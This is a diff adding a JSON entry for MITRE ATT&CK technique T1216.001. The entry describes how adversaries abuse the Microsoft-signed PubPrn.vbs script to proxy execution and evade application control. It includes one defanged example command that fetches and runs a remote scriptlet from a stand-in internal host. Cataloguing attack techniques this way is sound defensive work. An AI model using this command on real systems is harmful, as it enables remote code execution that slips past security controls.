@@ -1,0 +1,29 @@
+{
+    "id": "attack-pattern--09cd431f-eaf4-4d2a-acaf-2a7acfe7ed58",
+    "name": "PubPrn",
+    "description": "Adversaries may use the trusted PubPrn script to proxy execution of malicious files. This behavior may bypass signature validation restrictions and application control solutions that do not account for use of these scripts.\n\n<code>PubPrn.vbs</code> is a Visual Basic script that publishes a printer to Active Directory Domain Services. The script is signed by Microsoft and can be used to proxy execution from a remote site.(Citation: Enigma0x3 PubPrn Bypass) An example command is <code>cscript C[:]\\Windows\\System32\\Printing_Admin_Scripts\\en-US\\pubprn[.]vbs 127.0.0.1 script:http[:]//192.168.1.100/hi.png</code>.",
+    "references": [
+        {
+            "source_name": "mitre-attack",
+            "external_id": "T1216.001",
+            "url": "https://attack.mitre.org/techniques/T1216/001"
+        },
+        {
+            "url": "https://enigma0x3.net/2017/08/03/wsh-injection-a-case-study/",
+            "description": "Nelson, M. (2017, August 3). WSH INJECTION: A CASE STUDY. Retrieved April 9, 2018.",
+            "source_name": "Enigma0x3 PubPrn Bypass"
+        }
+    ],
+    "platforms": [
+        "Windows"
+    ],
+    "kill_chain": [
+        {
+            "kill_chain_name": "mitre-attack",
+            "phase_name": "defense-evasion"
+        }
+    ],
+    "permissions": [
+        "User"
+    ]
+}
